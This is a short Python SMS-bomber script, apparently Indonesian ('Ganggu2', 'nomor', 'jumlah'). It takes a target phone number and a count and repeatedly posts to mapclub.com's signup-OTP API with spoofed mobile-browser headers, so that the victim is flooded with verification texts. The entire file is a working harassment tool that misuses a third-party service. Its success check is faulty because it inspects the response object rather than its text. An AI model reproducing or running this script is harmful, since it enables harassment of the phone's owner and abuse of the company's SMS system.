import json
import requests
import sys
import os

def main():
	os.system('clear')
	os.system('figlet Ganggu2')
	banner= '''

	[★]Author :Gustian Projects
	'''

	print(banner)
	nomor = input('nomor : ')
	jumlah =input('jumlah : ')

	head = {
	"User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
	"Referer": "https://www.mapclub.com/en/user/signup",
	"Host": "cmsapi.mapclub.com",
	}


	dat = {
	'phone' : nomor
	}
	for x in range(int(jumlah)):
		leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp",headers=head, json=dat)
	if 'error' in leosureo:
		print('Gagal Mengirim  Sms' + nomor)
	else:
		print('Berhasil Mengirim Sms ke ' + nomor)



main()

